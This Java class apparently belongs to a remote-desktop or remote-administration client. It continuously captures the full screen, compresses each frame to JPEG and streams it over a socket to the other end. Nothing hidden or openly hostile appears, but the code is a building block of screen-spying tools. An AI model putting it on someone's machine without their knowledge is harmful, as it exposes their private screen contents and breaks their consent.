package me.client.send;

import me.client.Client;
import net.coobird.thumbnailator.Thumbnails;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.net.Socket;

public class SendScreen extends Thread{
   public DataOutputStream dataOutputStream;
   public Socket socket;
   public volatile boolean run = false;
    public SendScreen(DataOutputStream dataOutputStream, Socket socket) {
        this.dataOutputStream = dataOutputStream;
        this.socket = socket;
    }

    private byte[] getImage(Rectangle rectangle){
        Robot robot;
        try {
            robot = new Robot();
            BufferedImage bufferedImage = robot.createScreenCapture(rectangle);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            outputStream.flush();
            Thumbnails.of(bufferedImage).scale(1f).outputQuality(0.3f).outputFormat("jpg").toOutputStream(outputStream);
            return outputStream.toByteArray();
        } catch (Exception e) {
        }
        return null;
    }
    @Override
    public void run() {
        Toolkit toolkit = Toolkit.getDefaultToolkit();
        Dimension dimension = toolkit.getScreenSize();
        try {
            final int SEND = 400;
            Rectangle rectangle = new Rectangle(dimension);
            while (run) {
                Thread.sleep(1);
                byte[] bytes2 = getImage(rectangle);
                dataOutputStream.writeInt(SEND);
                dataOutputStream.writeInt(bytes2.length);
                dataOutputStream.write(bytes2);
                dataOutputStream.flush();
            }
        }catch (Exception e) {
        }
    }
}
